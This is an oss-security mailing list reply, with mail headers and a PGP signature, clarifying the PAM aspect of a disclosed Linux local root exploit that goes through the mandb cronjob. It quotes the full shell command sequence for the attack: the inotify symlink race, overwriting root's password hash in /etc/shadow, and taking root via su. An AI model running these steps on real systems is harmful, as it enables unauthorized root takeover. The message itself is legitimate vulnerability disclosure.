X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1781" "Tuesday" "15" "December" "2015" "19:25:30" "+0000" "halfdog" "me@halfdog.net" "<5670692A.4050001@halfdog.net>" "51" "Re: [oss-security] User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness" "^Date:" nil nil "12" "2015121519:25:30" "[oss-security] User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness" (number mark "        me@halfdog.n Dec 15   51/1781  " thread-indent "\"Re: [oss-security] User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness\"\n") "<86a8pbzr5u.fsf@desk.des.no>" ("<565F679F.9050600@halfdog.net>" "<566E0678.1080808@halfdog.net>" "<86fuz570iy.fsf@desk.des.no>" "<566F3135.4050009@halfdog.net>" "<86a8pbzr5u.fsf@desk.des.no>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 32221 invoked by uid 550); 15 Dec 2015 19:27:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32197 invoked from network); 15 Dec 2015 19:27:56 -0000
References: <565F679F.9050600@halfdog.net> <566E0678.1080808@halfdog.net>
 <86fuz570iy.fsf@desk.des.no> <566F3135.4050009@halfdog.net>
 <86a8pbzr5u.fsf@desk.des.no>
Message-ID: <5670692A.4050001@halfdog.net>
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
MIME-Version: 1.0
In-Reply-To: <86a8pbzr5u.fsf@desk.des.no>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
Date: Tue, 15 Dec 2015 19:25:30 +0000
From: halfdog <me@halfdog.net>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] User man Local Root Exploit/Linux Kernel setgid
 Directory Privilege Escalation/PAM Owner Check Weakness
To: oss-security@lists.openwall.com, des@des.no

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Dag-Erling Smørgrav wrote:
> halfdog <me@halfdog.net> writes:
>> Dag-Erling Smørgrav <des@des.no> writes:
>>> And the PAM issue?
>> That's the most questionable.
> 
> Hard to tell, since you didn't provide any information about it.
> You mentioned three issues, but linked to only two advisories,
> neither of which mentions PAM.

I was referring to this from [1], but perhaps I should have
highlighted it more prominently:


Using Timerace Using Inotify: As the mandb cronjob will change
ownership of any file to user man, there are numerous targets for
privilege escalation. The one I like best when /bin/su SUID binary
available is to change /etc/shadow. PAM just does not recognise this
state, so only root password has to be cleared for su logon. For that
purpose, the good old inotify-tool DirModifyInotify-20110530.c from a
previous article. To escalate following steps are sufficient:

man# mkdir -p /var/cache/man/etc
man# ln /var/crash/.lock /var/cache/man/etc/shadow
man# ./DirModifyInotify --Watch /var/cache/man/etc --WatchCount 0
- --MovePath /var/cache/man/etc --LinkTarget /etc
... Wait till daily cronjob was run
man# cp /etc/shadow .
man# sed -r -e
's/^root:.*/root:$1$kKBXcycA$w.1NUJ77AuKcSYYrjLn9s1:15462:0:99999:7:::/'
/etc/shadow > x
man# cat x > /etc/shadow; rm x
man# su -s /bin/sh (password is 123)
root# cat shadow > /etc/shadow; chown root /etc/shadow

[1]
http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/

- -- 
http://www.halfdog.net/
PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iEYEARECAAYFAlZwaSQACgkQxFmThv7tq+60RACfbNp7aKX+dAn9NhCbqP1m/O0g
iAQAnAqjS/ujumwfQV7K4AYTQ326QoZj
=zuRK
-----END PGP SIGNATURE-----
